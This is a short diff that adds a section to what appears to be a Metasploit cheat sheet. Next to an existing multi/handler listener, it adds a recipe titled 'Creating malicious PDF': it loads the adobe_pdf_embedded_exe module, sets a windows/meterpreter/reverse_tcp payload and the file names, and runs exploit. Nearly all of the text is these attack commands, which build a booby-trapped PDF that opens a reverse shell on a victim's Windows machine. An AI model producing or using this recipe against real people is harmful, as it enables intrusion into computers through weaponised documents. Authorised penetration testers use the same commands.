@@ -40,3 +40,14 @@ LPORT => 32119
 
 msf5 exploit(multi/handler) > run
 
+### [PDF]
+```
+Creating malicious PDF
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+
+set payload windows/meterpreter/reverse_tcp
+set INFILENAME x.pdf
+set FILENAME x.pdf
+exploit
+```
+
